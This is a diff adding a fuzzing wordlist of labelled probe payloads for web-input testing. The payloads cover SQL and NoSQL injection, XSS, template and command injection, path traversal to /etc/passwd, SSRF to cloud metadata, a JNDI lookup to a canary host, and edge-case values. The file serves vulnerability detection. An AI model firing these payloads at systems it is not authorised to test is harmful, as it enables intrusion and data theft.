@@ -1,0 +1,107 @@
+# Medium probe — broader edge cases that INDICATE the ability to exploit without breaking anything.
+# Still non-destructive: benign commands (id/whoami/echo), short 2s time delays, canary callback
+# hosts that don't resolve, and bounded sizes. Lines starting with "# " (or a lone #) are comments.
+# Marker "FZcanary" lets you grep responses. Watch for: 500/error, RAW reflection, a ~2s time jump
+# on the time-based lines (would indicate blind SQLi), or a different response length vs baseline.
+#
+# --- SQL injection: error-based ---
+'
+"
+')
+";
+')--
+" OR ""="
+' OR 1=1-- -
+' OR '1'='1
+' AND '1'='2
+admin'--
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+1)) OR 1=1-- -
+#
+# --- SQL injection: blind TIME-BASED (short 2s; a ~2s delay = likely injectable) ---
+'; WAITFOR DELAY '0:0:2'-- -
+' OR SLEEP(2)-- -
+'|| (SELECT pg_sleep(2))-- -
+1); WAITFOR DELAY '0:0:2'-- -
+#
+# --- NoSQL injection ---
+' || '1'=='1
+{"$gt":""}
+{"$ne":null}
+'; return true; var x='
+#
+# --- Cross-site scripting: contexts + polyglot ---
+<script>alert('FZcanary')</script>
+"><script>alert('FZcanary')</script>
+'><svg/onload=alert('FZcanary')>
+<img src=x onerror=alert('FZcanary')>
+javascript:alert('FZcanary')
+"onmouseover="alert('FZcanary')
+</title><script>alert('FZcanary')</script>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(alert('FZcanary'))//
+#
+# --- Template injection (SSTI) — math marker: a "49" in the response = evaluated ---
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+${{7*7}}
+@(7*7)
+{{'FZ'.join('xx')}}
+#
+# --- OS command injection (benign commands only) ---
+; id
+| id
+|| whoami
+&& whoami
+`id`
+$(id)
+; echo FZcanary
+%0a id
+#
+# --- Path / file traversal (more encodings) ---
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252fetc%252fpasswd
+....//....//....//etc/passwd
+/etc/passwd
+C:\windows\win.ini
+file:///etc/passwd
+#
+# --- SSRF / open redirect (canary + cloud metadata; non-exploit probes) ---
+http://fzcanary.invalid/
+//fzcanary.invalid/
+http://169.254.169.254/latest/meta-data/
+http://127.0.0.1:80/
+#
+# --- Log4Shell / JNDI (invalid host — detection only, no callback) ---
+${jndi:ldap://fzcanary.invalid/a}
+${env:PATH}
+#
+# --- Header / CRLF / encoding / unicode edge cases ---
+FZ%0d%0aX-Injected: FZcanary
+FZ%00canary
+%c0%ae%c0%ae/
+＜script＞FZcanary
+‮FZcanary
+﻿FZcanary
+#
+# --- Numeric / boundary ---
+-1
+0
+2147483648
+-2147483649
+9999999999999999999
+0x1F
+1e309
+00123
+#
+# --- Format string ---
+%s%s%s%s%s
+%n%n%n
+{0}{1}{2}
+#
+# --- Bounded oversize (512 chars — long enough to probe limits, small enough to be safe) ---
+FZcanaryAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
